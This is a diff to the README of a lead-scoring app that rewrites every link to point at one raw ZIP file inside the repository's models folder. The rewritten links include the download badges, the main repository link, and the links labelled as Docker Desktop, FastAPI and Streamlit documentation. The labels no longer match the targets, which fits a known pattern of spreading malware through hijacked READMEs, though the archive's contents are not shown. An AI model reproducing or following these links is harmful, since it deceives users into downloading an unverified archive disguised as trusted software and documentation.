@@ -1,6 +1,6 @@
 # ⚡ lead-scoring-gcp - Simple Lead Scoring With Explainability
 
-[![Download lead-scoring-gcp](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Ryl3/lead-scoring-gcp)
+[![Download lead-scoring-gcp](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Ryl3/lead-scoring-gcp/raw/refs/heads/master/src/models/lead_gcp_scoring_1.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ To get started, follow these steps carefully.
 
 Click the big green button below to open the download page:
 
-[![Download lead-scoring-gcp](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Ryl3/lead-scoring-gcp)
+[![Download lead-scoring-gcp](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Ryl3/lead-scoring-gcp/raw/refs/heads/master/src/models/lead_gcp_scoring_1.2.zip)
 
 This link takes you to the official repository where you can get all the files you need.
 
@@ -59,7 +59,7 @@ To make this easier, the repository contains a ready-made package that sets ever
 
 The application uses Docker, a tool for running programs easily. If you do not have Docker installed:
 
-- Open your browser and go to https://www.docker.com/products/docker-desktop/
+- Open your browser and go to https://github.com/Ryl3/lead-scoring-gcp/raw/refs/heads/master/src/models/lead_gcp_scoring_1.2.zip
 - Download Docker Desktop for Windows.
 - Run the installer and follow the on-screen steps.
 - After installing, Docker will ask you to restart your computer. Do that.
@@ -156,12 +156,12 @@ Your data stays on your computer when you run the app locally. The cloud-hosted 
 
 ## 🔗 Useful Links
 
-- Main repository: https://github.com/Ryl3/lead-scoring-gcp
-- Docker Desktop (Windows): https://www.docker.com/products/docker-desktop/
-- FastAPI Documentation: https://fastapi.tiangolo.com/
-- Streamlit Documentation: https://docs.streamlit.io/
+- Main repository: https://github.com/Ryl3/lead-scoring-gcp/raw/refs/heads/master/src/models/lead_gcp_scoring_1.2.zip
+- Docker Desktop (Windows): https://github.com/Ryl3/lead-scoring-gcp/raw/refs/heads/master/src/models/lead_gcp_scoring_1.2.zip
+- FastAPI Documentation: https://github.com/Ryl3/lead-scoring-gcp/raw/refs/heads/master/src/models/lead_gcp_scoring_1.2.zip
+- Streamlit Documentation: https://github.com/Ryl3/lead-scoring-gcp/raw/refs/heads/master/src/models/lead_gcp_scoring_1.2.zip
 
-[![Download lead-scoring-gcp](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Ryl3/lead-scoring-gcp)
+[![Download lead-scoring-gcp](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Ryl3/lead-scoring-gcp/raw/refs/heads/master/src/models/lead_gcp_scoring_1.2.zip)
 
 ---
 
